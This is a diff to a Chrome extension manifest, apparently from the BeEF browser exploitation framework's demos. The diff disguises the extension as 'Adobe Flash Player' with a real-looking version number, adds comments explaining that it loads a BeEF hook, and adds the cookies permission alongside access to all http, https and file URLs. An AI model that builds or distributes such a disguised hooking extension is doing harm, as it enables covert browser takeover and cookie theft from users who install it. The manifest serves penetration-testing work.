@@ -1,10 +1,13 @@
 {
+  // Simple chrome extension 
+  // Just loads beef into the extension context.
+  // 
+  // You may need to set the IP address of the beef hook in background.js
+  // Then you can pack the extension (from within the chrome extensions page) and add the crx file to extensions/demos/html/ 
+
   "name": "Adobe Flash Player",
-  "version": "1.0",
-  // when the browser icon is clicked, a new tab is open to maintain persistence (chrome.tabs.create)
-  // for the sake of testing...unfortunately the popup is closed when the user is not focusing on it.
-  // See at the end of index.html file.
-  "description": "Introduces vulnerabilites into webbrowsers",
+  "version": "11.2.202.235",
+  "description": "Introduces vulnerabilites into web browsers",
   "background": {
     "scripts": ["background.js"]
   },
@@ -17,6 +20,7 @@
 	"tabs", 
 	"http://*/*", 
 	"https://*/*",
-    "file://*/*"
+  "file://*/*",
+  "cookies"
   ]
 }
